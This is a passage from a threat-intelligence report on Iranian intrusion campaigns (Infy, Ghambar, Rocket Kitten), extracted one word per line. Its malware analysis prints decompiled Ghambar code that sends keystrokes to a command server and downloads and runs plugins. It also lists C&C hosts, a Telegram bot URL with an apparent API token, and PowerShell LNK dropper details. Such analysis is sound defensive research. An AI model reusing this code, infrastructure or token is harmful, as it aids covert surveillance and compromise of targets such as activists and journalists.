remain 
incontrol 
of 
alimited 
number 
of 
DGA 
names 
and 
other 
commandand 
control 
resources. 
Basedon 
these 
names, 
and 
the 
limited 
window 
they 
afforded 
the 
actors,the 
Infy 
group 
was 
able 
to 
push 
down 
Infy 
M 
to 
Infy 
clients 
in 
order 
to 
reassert 
control 
over 
asubset 
ofthe 
infected 
clients. 
These 
updatesmoved 
the 
clients 
to 
an 
alternative 
set 
of 
names 
registered 
to 
the 
group, 
but 
did 
not 
remove 
theprevious 
infections, 
potentially 
leading 
to 
phenomenaof 
clients 
infected 
with 
both 
versions 
ofthe 
client 
that 
was 
noted 
by 
Palo 
Alto. 


Palo 
Alto 
notes 
that 
in 
early 
June, 
the 
Infy 
actors 
had 
used 
command 
and 
controldomain 
names 
and 
addresses 
associated 
with 
an 
olderversion 
of 
Infy 
(versions15 
through 
24) 
in 
order 
to 
push 
down 
a 
new 
Infy 
M 
v. 
8.0 
client; 
an 
incident 
that 
represented 
their 
first 
observed 
transition 
from 
Infyto 
Infy 
M. 
Again 
by 
June 
12, 
the 
domain 
involved 
in 
this 
command 
and 
control 
function 
appearsto 
havebeen 
sinkholed. 
This 
was 
probably 
not 
thefirst 
time 
such 
an 
actionoccurred, 
and 
certainly 
not 
the 
last. 
In 
late 
June, 
the 
Infy 
actors 
used 
their 
remaining 
DGA 
domains 
to 
push 
an 
additional 
version 
of 
Infy 
M 
(still 
8.0) 
with 
another 
domain 
nameas 
the 
primarycommandand 
control 
(nstrad.dynu.com),which 
we 
were 
able 
to 
sinkhole. 
However, 
by 
thispoint 
theattritionof 
repetitivemigrationappeared 
to 
have 
set 
in. 
Only 
one 
client, 
based 
in 
Iran, 
continued 
tocommunicate 
withthe 
infrastructure. 


Infy(UnknownVariant)PostSinkholeInfections,
JuneJuly2016
While 
researchers 
have 
been 
successful 
in 
redirecting 
andregistering 
Infy 
hostname 
resources, 
at 
least 
a 
subset 
of 
the 
clients 
appear 
to 
beacon 
toa 
remaining 
address 
despite 
the 
original 
name 
(uvps1.cotbm.com) 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


beingsinkholed. 
It 
is 
unclear 
whether 
this 
is 
erroneous 
behavior 
or 
an 
undocumented 
mechanism 
of 
beaconing, 
however,a 
limited 
windowinto 
the 
activities 
between 
lateJune 
and 
midJuly 
2016 
implicates 
250 
IP 
address 
in19 
countries. 
A 
significant 
portion 
of 
these 
addresses 
appear 
to 
be 
dynamic 
IPs 
or 
VPNs, 
particularly 
those 
in 
Iran,suggesting 
the 
real 
number 
of 
infections 
is 
lower. 
These 
addresses 
are 
largely 
a 
disjoint 
set 
from 
thosethat 
responded 
to 
the 
DGA 
of 
the 
Infy 
agents, 
however, 
the 
regions 
and 
networks 
associated 
with 
the 
infections 
align 
with 
the 
client’s 
broadertrends. 
Theclient 
basecould 
originatefromthe 
Infy 
M 
network. 


Not 
matter 
the 
source 
or 
the 
cause 
ofthese 
continued 
client 
operations,the 
network 
remains 
active 
and 
the 
demonstrable 
success 
of 
the 
threat 
group 
in 
compromising 
critical 
targets 
gives 
pause 
to 
the 
prospects 
that 
the 
Infy 
campaign 
will 
end 
anytime 
soon. 


GhambarMalware 


In 
December2014,Cylancedescribed 
a 
set 
of 
actors 
and 
tools,labelled 
“Operation 
Cleaver,” 
which 
differed 
from 
those 
campaigns 
associated 
with 
Flying 
Kitten 
and 
Rocket 
Kitten. 
Cleaver 
was 
described 
as 
a 
persistent 
campaignconducted 
overseveral 
years, 
targeting 
economic 
infrastructure,defense 
corporations 
and 
governments 
in 
the 
MiddleEast 
and 
elsewhere. 
According 
to 
the 
tools 
and 
techniques 
used 
in 
the 
campaigns, 
oftencenteredon 
the 
development 
of 
a 
fictitious 
persona 
as 
a 
lure 
for 
employees 
of 
targeted 
companies, 
theCleaver 
threat 
group 
was 
considerablymore 
ambitious 
thanothergroups. 


While 
previous 
publication 
focused 
on 
espionage 
activities, 
the 
same 
personas 
and 
tools 
disclosed 
in 
reports 
on 
the 
groups 
arose 
in 
other 
incidents 
occurring 
at 
the 
same 
timethat 
were 
targetedagainst 
religiousminorities 
and 
foreignpolicy 
institutions 
focused 
on 
Iran. 
In 
our 
monitoring 
of 
activities 
similar 
to 
thoseof 
Cleaver 
over 
the 
course 
of 
two 
years, 
until 
at 
least 
June 
2016, 
oversixtyidentifieddomain 
names 
targeted 
a 
morediverse 
set 
of 
institutions 
and 
nationalities, 
including: 
an 
Israeli 
advocacy 
organization, 
American 
foreign 
policy 
institutions, 
Saudieconomicand 
governmental 
entities, 
international 
Iranian 
human 
rights 
organizations, 
the 
American 
and 
European 
defence 
industry 
base, 
activists 
mobilizing 
onFacebookfrominside 
of 
Iran, 
and 
civilaviationcompanies. 
Based 
on 
commonalities 
between 
toolkits 
and 
targeting, 
we 
believe 
that 
it 
is 
the 
same 
group, 
although 
we 
also 
believethe 
structure 
of 
the 
organization 
has 
shifted 
over 
recent 
months. 


Includedin 
these 
activities, 
we 
find 
indicationof 
thedevelopment 
of 
a 
successor 
to 
malware 
agents 
developed 
by 
the 
Cleaver 
actors. 
Currently, 
weidentify 
this 
malware 
family 
as 
“Ghambar,” 
due 
to 
the 
word 
being 
usedin 
some 
function 
names 
and 
variables 
inside 
the 
same 
malware’s 
code; 
also 
subsequent 
samples 
expose 
potentially 
personallyidentifiableinformation 
and 
alternativenames. 
While 
Ghambar 
does 
not 
seem 
to 
share 
any 
significant 
codebasewith 
past 
tools, 
webelieve 
that 
Ghambar 
might 
be 
the 
successor 
of 
TinyZBot, 
which 
is 
one 
of 
the 
artifacts 
described 
byCylancein 
theOperation 
Cleaver 
report. 
Similar 
to 
TinyZBot, 
Ghambar 
is 
also 
developed 
in 
C# 
andit 
employs 
thesame 
SOAPbased 
command 
and 
control 
protocol. 
While 
it 
is 
provided 
with 
fewer 
features,Ghambar 
appears 
better 
designed 
and 
with 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


a 
cleaner 
code 
style. 
The 
samples 
weobtained33 
dates 
to 
NovemberDecember 
2015 
and 
late 
April 
2016, 
representing 
distinct 
points 
in 
the 
development 
cycle 
ofthe 
agent. 


private 
static 
void 
Main() 


{ 
try{ 


Utils.DbgPrint(".: 
In 
the 
name 
of 
God 
:."); 
... 


Within 
the 
decompiled 
code 
we 
find 
referencesto 
Islam, 
with 
thefirst 
instruction 
on 
installation 
of 
the 
development 
version 
of 
Ghambar 
being 
the 
printing 
of 
the 
debugstring 
of 
“In 
the 
name 
of 
God.” 
This 
feature 
is 
the 
shortenversion 
of 
the 
phrase 
"In 
thename 
of 
God,the 
Most 
Gracious, 
the 
Most 
Merciful" 
(Bismillah 
irRahman 
irRahim). 
The 
connotation 
of 
the 
phrase 
and 
its 
placement 
is 
notable, 
Bismallah 
is 
the 
introductionof 
most 
chapters 
of 
the 
Quran, 
and 
is 
commonlyreferenced 
within 
the 
political 
discourse 
of 
Muslim 
societies. 
Its 
inclusion 
in 
less 
public 
aspects 
of 
Cleaver’soperation 
may 
provide 
insight 
into 
the 
developersof 
Ghambarand 
their 
reasons 
for 
engaging 
insuch 
campaigns.34 



Ghambar’s 
use 
in 
the 
wild 
was 
directly 
observed 
in 
April 
2016 
when 
a 
number 
ofhuman 
rights 
activists 
in 
the 
diaspora 
received 
invitations 
to 
a 
“Middle 
EastHuman 
rights 
Webinar” 
hostedby 
a 
small 
Spanish 
university. 
TheCleaver 
actors 
breached 
the 
main 
site 
ofthe 
university,believed 
to 
be 
achievedthrough 
the 
exploitation 
ofa 
software 
vulnerability 
(a 
Nessus 
installation 
was 
found 
on 
a 
related 
attackermaintained 
server). 
Using 
the 
valid 
Sender 
Policy 
Framework 
address, 
the 
actors 
were 
then 
able 
to 
send 
legitimateappearing 
messages 
posing 
as 
the 
university 
that 
appeared 
to 
be 
invitations 
to 
anAdobe 


33 
MSPavilion.exe 
00b5d45433391146ce98cd70a91bef08 
34 
Or 
their 
sense 
ofhumor. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Connect 
webinar. 
The 
referenced 
conference 
information 
was 
then 
hosted 
on 
the 
university 
site, 
leading 
to 
valid 
links 
aswell. 
Once 
on 
thepage, 
and 
only 
if 
the 
user 
appeared 
to 
be 
on 
Windows, 
thepage 
would 
trigger 
a 
warning 
about 
anAdobe 
Flash 
update. 
As 
common 
elsewhere, 
the 
downloaded 
installerwould 
bea 
legitimate 
version 
of 
Flash 
bundled 
with 
Ghambar. 


StructureandOperations 


Ghambar 
is 
written 
in 
C# 
and 
appears 
distributed 
obfuscated 
with 
SmartAssembly. 
Using 
de4dot35 
we 
can 
easily 
deobfuscate 
the 
code 
and 
withILSpy36 
decompile 
the 
binary 
to 
its 
original 
source 
code. 
Within 
the 
decompiled 
source 
code 
we 
quicklyobserve 
thatthe 
malwareisprovided 
with 
a 
debugging 
option 
in 
the 
case 
the 
file 
“D:\Debug.Me” 
is 
present: 


public 
static 
void 
DbgPrint(string 
log) 


{ 
if 
(File.Exists("D:\\Debug.Me")) 
{ 


Debug.Write(log); 
}
} 


By 
creating 
an 
empty 
file 
at 
that 
particular 
path,we 
can 
enable 
the 
logging 
whichishelpful 
and 
interesting 
when 
monitoring 
an 
initial 
execution: 


35 
http://de4dot.com/ 
36 
http://ilspy.net/ 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



What 
the 
main 
function 
does 
is 
install 
the 
malware 
in 
the 
proper 
folder 
(“%AppData%\Pavilion\MSPavilion.exe”) 
and 
registers 
itin 
the 
Run 
registrykey 
to 
gainpersistence. 
The 
main 
function 
then 
finally 
launches 
a 
new 
instance 
of 
the 
newly 
copied 
executable. 
The 
new 
process, 
after 
invoking 
a 
selfexplanatory 
and 
ambitious 
function 
called 
ManualSleepToBypassAv, 
will 
load 
the 
configurationfromits 
ownresources. 
An 
example 
of 
the 
deobfuscated 
configuration 
in 
included 
at 
Appendix 
“Ghambar 
Configuration.” 


If 
the 
configuration 
providespaths 
to 
either 
a 
JPGor 
a 
PDF 
file, 
the 
Ghambar 
will 
open 
them 
as 
decoy. 
The 
malware 
will 
then 
collect 
some 
basic 
information 
on 
the 
compromised 
system,instantiate 
a 
connection 
to 
the 
command 
and 
control, 
andregister 
to 
it. 
Subsequently, 
it 
initializes 
a 
keylogger 
with 
the 
traditional 
SetWindowsHookEx 
technique, 
as 
well 
as 
a 
procedure 
to 
communicate 
and 
receive 
commands 
from 
the 
C&C: 


private 
static 
void 
IterativeRoutinsProc(ServiceManifest 
communicationChannel)

{ 
try{ 


while 
(true)
{ 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Utils.DbgPrint("CommandControlProc"); 
CommandControlController.CommandControlProc(communicationChannel,
Program.ConfigInfo.TargetId); 
Program.FileUploader.UploadAllOfflineFiles(communicationChannel,

Program.ConfigInfo.TargetId); 
Utils.ManualSleepToBypassAv(30); 
Thread.Sleep(30000); 
Utils.HeyImOnline(Program._communication,

Program.ConfigInfo.TargetId); 


}
} 
catch 
(Exception 
ex)
{ 


Utils.DbgPrint(string.Format("EX 
: 
{0} 
Method 
: 
{1}", 
ex.Message,
MethodBase.GetCurrentMethod().Name)); 
}
} 


As 
you 
can 
see 
from 
the 
procedure 
above, 
before 
the 
regular 
checkinwith 
the 
C&C, 
the 
malware 
invokes 
Program.FileUploader.UploadAllOfflineFiles. 
Interestingly, 
Ghambar 
is 
designed 
toleave 
as 
little 
footprinton 
the 
system 
as 
possible. 
When 
collecting 
screenshots, 
clipboard 
data, 
andintercepted 
keystrokes, 
it 
attempts 
to 
directlysend 
the 
data 
to 
theC&C 
without 
writing 
on 
disk. 
For 
example, 
we 
can 
observe 
this 
behaviorin 
the 
followingportion 
of 
code 
handlingintercepted 
keystrokes 
data: 


private 
static 
void 
KeylogBufferArrived(string 
buffer)

{ 
if 
(!string.IsNullOrEmpty(buffer)) 
{ 


try

{ 
if 
(Utils.IsServerEndpointAvaliable()) 
{ 


bool 
flag; 
Program._communication.SendKeyLog(Program.ConfigInfo.TargetId,

DateTime.Now, 
true, 
buffer, 
out 
flag, 
out 
Program._tempSpecified); 
} 
else 
{ 


string 
keyloggerStoragePath 
= 


IoPathUtils.GetKeyloggerStoragePath(); 
if 
(!Directory.Exists(keyloggerStoragePath)) 
{ 


Directory.CreateDirectory(keyloggerStoragePath); 
} 
string 
path 
= 
Path.Combine(keyloggerStoragePath,

Path.GetRandomFileName()); 
File.WriteAllText(path, 
buffer); 


}
} 
catch 
(Exception 
ex) 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


{ 
Utils.DbgPrint(string.Format("EX 
: 
{0} 
Method 
: 
{1}", 
ex.Message,
MethodBase.GetCurrentMethod().Name)); 
}
}
} 


In 
case 
the 
C&C 
is 
available, 
the 
data 
buffer 
is 
directly 
sent 
over, 
otherwise 
it 
is 
storedin 
a 
directory 
specified 
in 
theconfiguration 
properties. 
In 
the 
latter 
case,when 
at 
the 
next 
iteration 
UploadAllOfflineFiles 
is 
called, 
thefiles 
on 
disk 
will 
be 
deleted. 


While 
executing 
a 
parallel 
keylogger, 
Ghambar 
is 
also 
ableto 
receive 
instructions 
from 
the 
C&Con 
additional 
tasks 
toexecute. 
These 
tasks 
can 
be 
additional 
plugins 
to 
bedownloaded 
and 
executed,generic 
tasks 
on 
thefilesystem, 
or 
anumber 
of 
predefined 
commands. 
Following 
is 
the 
portionof 
code 
responsible 
for 
fetching 
pending 
tasks 
for 
those 
three 
categories, 
Appendix 
“Ghambar 
Command 
Control” 
include 
the 
pertinent 
code. 


Ghambar 
is 
provided 
with 
a 
fullfeatured 
plugins 
system. 
If 
instructed 
to 
do 
so 
by 
theC&C, 
themalware 
is 
ableto 
download, 
store, 
and 
execute 
anygiven 
plugin. 
In 
the 
following 
relevant 
snippet, 
youcanalso 
observe 
a 
mentionto 
a 
_ghambarService. 


public 
void 
ProcessPlugins(T4[] 
plugins)

{ 
Utils.DbgPrint(MethodBase.GetCurrentMethod().Name); 
for 
(int 
i 
= 
0; 
i 
< 
plugins.Length; 
i++)
{ 


T4 
t 
= 
plugins[i]; 
string 
text 
= 
CommandProcessor._ghambarService.DownloadPlugin(t.ID); 
if 
(!string.IsNullOrEmpty(text)) 
{ 


byte[] 
bytes 
= 
Convert.FromBase64String(text); 
string 
path 
= 
Path.Combine(IoPathUtils.GetPluginsPath(), 
t.ID); 
path 
= 
Path.ChangeExtension(path, 
t.FileFormat); 
if 
(!Directory.Exists(IoPathUtils.GetPluginsPath())) 
{ 


Directory.CreateDirectory(IoPathUtils.GetPluginsPath()); 
}
File.WriteAllBytes(path, 
bytes); 
if 
(File.Exists(path)) 
{ 


bool 
isActive 
= 
PluginUtils.InstallPlugin(t); 
bool 
flag; 
bool 
flag2; 


CommandProcessor._ghambarService.SetPluginActiveState(this._targetId, 
t.ID,
isActive, 
true, 
out 
flag, 
out 
flag2); 
}
} 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


}

} 


Otherthan 
generally 
creating, 
deletingand 
fetching 
files, 
Ghambar 
is 
also 
able 
to 
executed 
a 
number 
of 
predefined 
commands 
if 
instructed 
todo 
so 
by 
the 
C&C. 
The 
commands, 
identified 
by 
a 
commandtype 
identifier, 
include 
the 
following: 


● 
Selfdestruct; 
● 
Executeacommandthrough 
cmd.exe 
and 
return 
output; 
● 
Take 
a 
screenshot; 
● 
Shutdownthecomputer; 
● 
Restart 
the 
computer; 
● 
Logoff 
the 
user; 
● 
Lock 
the 
computer; 
● 
Turnonandoffthemonitor; 
● 
Set 
and 
copy 
clipboard 
data; 
● 
Enableordisablemouse/keyboard(althoughtheseproceduresarenotyetimplemented); 
● 
“Enableordisabledesktop” 
(notimplemented); 
● 
TriggeraBSOD(also,notimplemented). 
While 
the 
sample 
we 
obtained 
might 
be 
an 
earlier 
stage 
still 
under 
development, 
Ghambar 
is 
already 
provided 
with 
enough 
features 
to 
make 
it 
afullyfunctional 
backdoor. 


Infrastructure 


The 
Ghambar 
samplewe 
obtainedisconfigured 
to 
contact 
thedomain 
nvidiaupdate.
com. 
Prior 
toits 
lapse, 
the 
domainresolved 
to 
the 
IP 
address 
85.17.172.180, 
hosted 
at 
Leaseweb 
inthe 
Netherlands. 
Ghambar 
interacts 
with 
theserver 
with 
aSOAPbased 
XML 
protocol 
on 
port 
5050, 
with 
well 
defined 
structures 
and 
events 
that 
very 
granularly 
defines 
the 
processesof 
registering 
the 
compromised 
computers, 
fetch 
commands, 
and 
report 
their 
results. 
It 
doesn’t 
employ 
any 
encryption 
algorithm, 
it 
occasionally 
just 
compresses 
with 
zlib 
and 
encodes 
inbase64 
particularly 
large 
portions 
of 
data. 


Appendix 
“Ghambar 
Network” 
is 
a 
typical 
exchange 
between 
the 
compromisedhost 
and 
the 
command 
and 
control 
server, 
from 
initial 
registration 
to 
command 
fetching. 
For 
the 
sake 
of 
clarity, 
we 
broke 
down 
and 
formatted 
the 
contentof 
thecommunication 
stream. 


RocketKitten 


Beginning 
in 
April 
2014, 
Israeli 
academicinstitutions 
and 
corporationsbegan 
to 
encounter 
persistent 
spearphishing 
attempts 
through 
emails 
with 
attached 
Microsoft 
Office 
documents 
that 
had 
embedded 
copies 
of 
the 
CORE 
Impact 
penetration 
testingagent.37 
Across 
multiplereports 
on 
intrusion 
attempts 
against 
Israeli 
academicsand 
internationalhuman 
rights 
advocates, 
a 
collective 
set 
ofactors 
labelled 


37 
http://www.clearskysec.com/gholeeaprotectiveedgethemedspearphishingcampaign/ 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


“Rocket 
Kitten” 
was 
documentedas 
conducting 
account 
credential 
phishing 
and 
malware 
campaigns 
basedon 
a 
changing 
set 
of 
tactics 
and 
tools. 
The 
origin 
of 
theseactors 
was 
established 
andaffirmed 
through 
Persianlanguage 
references 
in 
malware 
code, 
disclosures 
of 
IP 
addresses 
incompromised 
accounts, 
patterns 
in 
the 
selection 
of 
targets, 
and 
native 
Persianlanguage 
inspearphishing 
messages. 
Moreover, 
poor 
isolation 
ofactivities 
and 
failures 
to 
secure 
malware 
infrastructure 
led 
to 
the 
identification 
of 
oneof 
theauthors 
of 
the 
group’s 
phishing 
and 
malware 
systems,Yaser 
Balaghi, 
pseudonymous 
operating 
as 
“Wool3n.H4t.” 
As 
researchers 
pursued 
Rocket 
Kitten’s 
activities 
over 
time, 
a 
common 
pattern 
ofspearphishing 
campaigns 
reflecting 
theinterests 
and 
activities 
ofthe 
Iranian 
securityapparatus 
became 
apparent, 
one 
which 
continues 
with 
a 
demonstrable 
evolution 
based 
on 
a 
learning 
process 
over 
efforts 
that 
include 
dozens 
of 
domain 
names 
and 
shifting 
infrastructure, 
and 
is 
broader 
than 
one 
individual. 


The 
infrastructure 
and 
tactics 
documented 
across 
the 
Rocket 
Kitten 
campaigns 
represent 
a 
visible 
break 
from 
the 
Flying 
Kitten 
activities 
documented 
byFireEye. 
Days 
after 
the 
May 
2014 
Operation 
Saffron 
Rose 
report, 
thedozens 
of 
domains 
and 
servers 
connected 
with 
thegroup, 
which 
had 
been 
active 
until 
publication, 
were 
taken 
down 
or 
lapsed, 
notto 
be 
used 
again. 
The 
lull 
inintrusion 
attempts 
reported 
against 
Iranian 
activists 
afterthis 
cessation 
lasted 
fourmonths, 
until 
an 
Iranianjournalist 
received 
notifications 
purportingto 
be 
from 
Googleclaiming 
that 
their 
accounts 
hadbeen 
accessed 
from 
“The 
Russia” 
with 
theIP 
address 
“109.172.51.147.” 
The 
spearphishing 
message, 
sent 
from 
a 
compromised 
British 
quilting 
society’s 
site, 
directed 
thetarget 
to 
a 
userspecificaccount 
credential 
phishing 
page 
on 
the 
domain 
“accountgoogle.
co” 
that 
wasregistered 
in 
July 
ofthat 
year. 
Over 
the 
following 
month, 
more 
human 
rights 
activists 
and 
journalists 
received 
similar 
notifications 
and 
other 
spearphishing 
attempts 
that 
would 
later 
be 
associated 
with 
Rocket 
Kitten, 
marking 
the 
start 
of 
renewed 
intrusion 
campaigns 
against 
Iranians 
inside 
of 
the 
country 
and 
the 
diaspora. 
Rocket 
Kitten’s 
activities 
are 
clearly 
discernable 
up 
until 
publication 
of 
thisreport, 
and 
while 
more 
information 
on 
these 
actors 
activities 
against 
humanrights 
organizations 
will 
be 
forthcoming, 
this 
section 
is 
intended 
to 
provide 
insight 
into 
two 
emergingtrends 
connected 
to 
the 
threat 
group. 


Telegram 


When 
theRocket 
Kitten 
group 
breached 
thesocial 
media 
and 
personal 
email 
accounts 
of 
a 
prominent 
Iranian 
inApril 
2016, 
theintruders 
then 
engaged 
in 
conversationswith 
her 
contacts 
and 
individuals 
inthe 
human 
rights 
community. 
Amongst 
credential 
phishing 
attempts, 
inthose 
conversations, 
the 
impersonator 
would 
ask 
if 
theyhad 
a 
Telegram 
account, 
and 
then 
ask 
for 
a 
“conversation 
request 
code” 
– 
in 
actuality 
the 
onetime 
loginpasswordprovided 
bySMS 
to 
the 
user. 
The 
new 
focus 
on 
themessaging 
service 
followed 
its 
rapid 
rise 
inthe 
popularity 
after 
interferencewith 
Viber, 
especially 
withpolitical 
organizations 
to 
mobilize 
constituencies 
in 
the 
February 
2016Parliamentary 
Election. 
Moreover, 
while 
Telegram 
has 
grown 
popular 
in 
Iran 
in 
partdue 
to 
their 
claims 
of 
user 
security, 
the 
application 
is 
more 
vulnerableto 
compromise 
than 
other 
online 
services 
if 
the 
user 
does 
not 
take 
additionalmeasures 
to 
protect 
their 
account 
due 
to 
itsreliance 
on 
mobile 
operators. 


Connected 
to 
this 
infrastructure 
is 
indication 
that 
that 
the 
Rocket 
Kitten 
group 
haveengaged 
in 
a 
brute 
force 
enumeration 
of 
Telegram 
accounts 
connected 
with 
Iranian 
telephone 
numbers 
through 
theAPI 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


services 
providedto 
developers. 
TheGoogle 
credential 
phishingdomain 
used 
in 
the 
April 
2016 
incident 
overlapped 
with 
at 
least 
two 
domains, 
“shaftool.com” 
(176.102.64.206) 
and 
“ghalpaq.com” 
(185.130.226.12). 
According 
to 
accessible 
logs, 
theactors 
had 
registered 
dozens 
of 
API 
access 
codes 
and, 
when 
thesekey 
wouldbe 
revoked 
by 
Telegram 
for 
overuse,the 
script 
would 
simply 
move 
on 
to 
the 
next 
key. 
These 
API 
keys 
corresponded 
with 
bots 
labeled 
“Ghodrat” 
(ghodrad2015_bot) 
and 
“Shaftool” 
(shaftool_bot), 
which 
reported 
backto 
thesameset 
of 
Telegram 
users 
on 
aperiodicbasis 
about 
the 
number 
of 
users 
the 
script 
hadidentified. 
Over 
the 
course 
of 
several 
days, 
the 
operation 
was 
able 
to 
identify 
at 
least 
over 
15 
million 
Iranian 
phone 
numbers 
withTelegram 
accounts 
registered 
to 
them 
and 
the 
associated 
user 
IDs, 
potentially 
approaching 
20 
million 
before 
the 
infrastructure 
was 
takedown 
and 
in 
subsequent 
operations. 
While 
this 
information 
would 
not 
itself 
allow 
for 
the 
compromise 
ofan 
account,it 
would 
provide 
a 
map 
of 
the 
Iranian 
user 
base 
ofthe 
service 
that 
could 
be 
used 
for 
subsequent 
investigations 
and 
phishingattempts. 


Telegram 
Enumeration 
Script 
Report 
Back 
https://api.telegram.org/bot209917679:AAHPszmDRqj3mKLjbK0nDZRSYlKjZyhacs/
sendMessage?c 
hat_id=145121195&text=Total 
Numbers: 
1012204 


This 
network 
mapping 
operation 
had 
deeper 
ties 
tointrusion 
campaigns 
targeting 
chat 
applications, 
indicating 
a 
systemic 
engagement 
on 
the 
platform. 
The 
registration 
information 
of 
the 
two 
domains,in 
particular 
the 
strange 
emailaddress, 
telephone 
number 
and 
organization 
of 
“Tele 
comunication,” 
connect 
the 
infrastructure 
to 
several 
typographic 
account 
credential 
phishing 
domainsthat 
posed 
asTelegram. 
The 
Telegram 
impersonation 
domains 
registered 
within 
short 
succession 
of 
each 
other 
in 
the 
middle 
of 
February 
2016. 
Further 
domainsregisteredin 
thesame 
naming 
schema 
later, 
but 
resembling 
the 
Ghalpaq 
host 
(“5server.
us”, 
“6server.
us”, 
“ghalpaq.us”, 
“pashmool.com”. 
“kashkoolak.com”) 
indicate 
continued, 
large 
scale 
abuseof 
Telegram’s 
API 
in 
support 
intrusion 
activities 
conductedagainst 
users 
of 
the 
application. 


Spearphishing 
is 
not 
the 
only 
meansof 
intrusion 
into 
Telegramaccounts. 
The 
common 
formof 
authentication 
formost 
mobile 
chat 
applications 
is 
through 
providing 
the 
user 
anaccess 
code 
thatis 
sent 
by 
SMS 
message 
to 
the 
user. 
Since 
SMS 
messages 
are 
subject 
to 
interceptionand 
surveillance 
by 
telecommunications 
networks, 
the 
user’s 
phoneservice 
therefore 
has 
access 
to 
their 
password. 
Additionally, 
mobile 
networks 
are 
vulnerable 
to 
a 
wide 
range 
of 
attacks,fromsocial 
engineering 
of 
providers 
to 
attacks 
on 
systems 
that 
allowphones 
to 
roam 
across 
networks. 
In 
practice, 
an 
attackercould 
convince 
or 
compell 
a 
mobile 
provider 
to 
issue 
a 
copy 
of 
the 
target’s 
SIM 
cardand 
receive 
messages 
bound 
for 
that 
user, 
including 
their 
access 
code. 
These 
tactics 
have 
been 
documented 
in 
Egypt 
and 
Russia. 
Based 
on 
accounts 
from 
multiple 
individual 
inside 
of 
the 
country,these 
tacticsappearto 
havebeen 
used 
in 
Iran 
in 
order 
to 
gain 
accessto 
theTelegram 
accounts 
of 
individuals 
connected 
with 
influential 
political 
opposition 
figures, 
women’s 
rights 
activists 
andother 
surveillance 
targets. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


Metasploit 


Fromthe 
outset 
of 
publicity 
on 
Rocket 
Kitten’s 
operations, 
researchers 
have 
identifieda 
reliance 
on 
simple 
tactics 
and 
commercialofftheshelf 
tools 
in 
order 
to 
capture 
credentials 
andacquire 
access 
to 
devices. 
In 
late 
2014, 
these 
operations 
were 
conducted 
throughCORE 
Impact, 
shifting 
over 
the 
following 
year 
to 
other 
agents. 
Since 
then, 
in 
particularsince 
Spring 
2016, 
we 
find 
an 
increasing 
use 
of 
the 
Metasploit 
Meterpreter 
agent 
coupled 
with 
basic 
socialengineering 
practices 
as 
the 
primary 
mechanism 
of 
intrusionsof 
Rocket 
Kitten. 


Rocket 
Kitten’s 
tactics 
over 
the 
duration 
of 
our 
observation 
continue 
a 
common 
pattern. 
Whenone 
individual 
was 
compromised 
by 
an 
unknown 
mechanism, 
the 
attackeraccessed 
their 
social 
networking 
accounts 
from 
a 
VPN 
service 
inFlorida. 
The 
first 
action 
of 
theintruder 
was 
to 
download 
an 
archive 
of 
their 
personal 
datathrough 
Facebook’sDownload 
Your 
Information 
tool 
(documented 
by 
thenotification 
email 
receivedfromFacebook), 
and 
then 
change 
the 
accountemail 
address. 
Oncecompromised, 
the 
intruders 
impersonated 
the 
victim 
and 
overFacebookmessage 
began 
toapproach 
dozens 
of 
their 
contacts 
in 
the 
media, 
sendinga 
compressed 
archive 
claiming 
to 
be 
a 
set 
of 
pictures. 


At 
the 
sametime, 
a 
Telegramaccount 
portraying 
a 
young 
woman 
named 
“Hoda 
Hajibagher” 
began 
to 
engage 
members 
of 
the 
diaspora, 
sending 
provocative 
pictures 
and 
promising 
more 
pictures 
at 
a 
link. 
The 
links 
would 
leadto 
a 
Google 
credential 
phishing 
page 
that 
resembled 
the 
structure 
and 
tactics 
of 
Rocket 
Kitten 
attempts 
over 
the 
previous 
year. 
Concurrently,a 
Gmail 
account 
for 
Hajibagher 
also 
began 
to 
engage 
others 
over 
email, 
sending 
adocumentcontaining 
malware 
embedded 
as 
amacro 
in 
a 
Word 
document 
(Document.docm). 
Since 
this 
initial 
set 
of 
incidents, 
the 
sameactors 
have 
continued 
on 
to 
createfake 
Facebook 
resources 
in 
order 
to 
host 
malware 
attempts 
or 
to 
supportfictitious 
personasused 
in 
more 
elaborate 
social 
engineeringschemes. 




Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


ImpersonationFacebookPage(July2016) 


Both 
the 
bait 
document 
from 
Hoda 
and 
thepictures 
from 
the 
compromised 
account 
are 
malware 
that 
appear 
to 
beconnected 
to 
the 
same 
setof 
actors 
employing 
Meterpreter 
as 
reverse 
shell 
into 
compromised 
systems. 
Images 
of 
women 
and 
politics 
as 
bait 
documents 
would 
be 
intermingled 
with 
a 
dropper(a 
shortcut 
file 
embedded 
with 
powershell) 
that 
would 
connect 
toa 
remote 
server 
to 
retrieve 
an 
agent, 
including 
potentially 
Android 
version 
of 
theMeterpreter 
toolkit. 
These 
backend 
servers 
also 
commonly 
exposedinstallationsoftheMetasploitframework. 
Intheattacksweobservedvictimsweresentarchives 
called 
“Copy 
of 
photos.rar”normally 
containing 
four 
distinct 
.LNK 
files: 



The 
LNKfiles 
have 
the 
following 
properties, 
with 
very 
minor 
changes 
to 
the 
payloads: 


[Link 
Info]
Location 
flags: 
0x00000001 
(VolumeIDAndLocalBasePat 
h)
Drive 
type: 
3 
(DRIVE_FIXED)
Drive 
serial 
number: 
703ca852 
Volume 
label 
(ASCII): 
Local 
path 
(ASCII): 
C:\Windows\System32\WindowsPowerShell\v1 
.0\powershell.exe 


[String 
Data]
Comment 
(UNICODE): 
windows 
photo 
viewer 
Relative 
path 
(UNICODE): 
..\..\..\..\Windows\System32\WindowsPowe 
rShell\v1.0\powershell.exe 
Arguments 
(UNICODE): 



Iran 
and 
the 
Soft 
